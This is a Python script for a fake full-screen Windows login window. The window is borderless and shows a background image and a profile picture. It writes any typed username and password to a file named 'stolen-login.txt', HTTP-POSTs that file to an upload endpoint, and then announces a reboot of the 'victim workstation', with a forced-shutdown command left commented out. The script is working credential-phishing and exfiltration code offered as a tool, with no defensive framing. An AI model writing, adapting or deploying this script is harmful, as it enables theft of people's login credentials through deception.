import os
import screeninfo
from tkinter import *
from PIL import ImageTk, Image
import requests

# Get the primary screen information
screen = screeninfo.get_monitors()[0]


# Set TARGET URL for the remote HTTP server
url = 'http://localhost:80/upload'

# Set the file path for the text file to be uploaded
credentials_file_path = 'stolen-login.txt'

# Print the screen resolution
print("Screen resolution: {}x{}".format(screen.width, screen.height))
x = screen.width
y = screen.height

# Calculate the center of the screen
center_x = x // 2
center_y = y // 2

# Calculate the offsets for the window and its contents
window_offset_x = center_x - 200
window_offset_y = center_y - 150
entry_offset_x = window_offset_x + 100

# Create the main window
root = Tk()
root.title("Login")
root.geometry(str(x) + "x" + str(y))

# Remove the window border and make the window full screen
root.attributes('-fullscreen', True)
root.overrideredirect(1)

# Add the background image
bg_image = Image.open("D:\programming\python\windows.png")
bg_image = bg_image.resize((x, y), Image.ANTIALIAS)
bg_image = ImageTk.PhotoImage(bg_image)
bg_label = Label(root, image=bg_image)
bg_label.place(x=0, y=0)

# Define a function to save the username and password to file
def save_login_info(event=None):
    username = username_entry.get()
    password = password_entry.get()
    with open(credentials_file_path, "w") as f:
        f.write("Username: {}\nPassword: {}".format(username, password))
    root.destroy()

# Add the username and password fields as Entry widgets with default text
username_entry = Entry(root, fg="grey", width=20, font=("Segoe UI", 19))
username_entry.insert(0, "Username")
username_entry.bind("<FocusIn>", lambda event: username_entry.delete(0, END))
username_entry.place(x=entry_offset_x, y=window_offset_y + 100)

password_entry = Entry(root, show="*", fg="grey", width=20, font=("Segoe UI", 19))
password_entry.insert(0, "Password")
password_entry.bind("<FocusIn>", lambda event: password_entry.delete(0, END))
password_entry.place(x=entry_offset_x, y=window_offset_y + 150)

# Load the login button image
login_image = Image.open("D:/programming/python/arrow1.png")
login_image = login_image.resize((36, 36), Image.ANTIALIAS)
login_image = ImageTk.PhotoImage(login_image)


# Load the Profile image
profile_image = Image.open("D:/programming/python/profile5.png")
profile_image = profile_image.resize((260, 260), Image.ANTIALIAS)
profile_image = ImageTk.PhotoImage(profile_image)
profile_label = Label(root, image=profile_image)
profile_label.place(x=window_offset_x + 100, y=window_offset_y - 200)

# Add the login button
login_button = Button(root, image=login_image, command=save_login_info, borderwidth=0)
login_button.place(x=window_offset_x + 325, y=window_offset_y + 151)

# Bind the Enter key to the save_login_info function
root.bind("<Return>", save_login_info)

# Start the main event loop
root.mainloop()

print("post file to remote server: ")

# Open the file and read its contents
with open(credentials_file_path, 'r') as f:
    file_content = f.read()

# Set the HTTP headers for the request
headers = {'Content-Type': 'text/plain'}

# Send the HTTP POST request to the server
response = requests.post(url, headers=headers, data=file_content)

# Print the response from the server
print(response.text)

print("REBOOT VICTIM WORKSTATION!")

os.system('echo shutdown')
# os.system('shutdown /r /f /t 0')


